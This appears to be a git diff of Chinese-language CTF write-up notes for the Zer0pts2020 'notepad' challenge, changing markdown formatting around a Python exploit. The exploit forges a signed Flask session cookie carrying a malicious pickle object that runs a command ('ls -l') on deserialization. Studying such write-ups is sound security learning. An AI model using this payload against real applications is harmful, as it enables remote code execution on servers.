@@ -2583,9 +2583,7 @@ request.query_params.keys()有两个key值连在一起 `67eb9cc01b6d566e811945ab
 ![Untitled](../BUU月赛/attachment/Python%202c1838eaf9de4ce0a9b5157ca12cec49/Untitled%205.png)
 
 ## [Zer0pts2020]notepad(ssti+python反序列化) #pickle反序列化
-
 app.py
-
 ```python
 import flask
 import flask_bootstrap
@@ -2780,7 +2778,7 @@ s = URLSafeTimedSerializer(
 data = s.loads(session)
 
 cmd = ["ls", "-l"]
-# inject
+```
 class Evil(object):
     def __init__(self, cmd):
         self.cmd = cmd
@@ -2791,7 +2789,7 @@ evil = [
     {"date": "", "text": "", "title": Evil(cmd)}
 ]
 data['savedata'] = base64.b64encode(pickle.dumps(evil))
-# generate
+### generate
 cookies = {
     "session": s.dumps(data)
 }
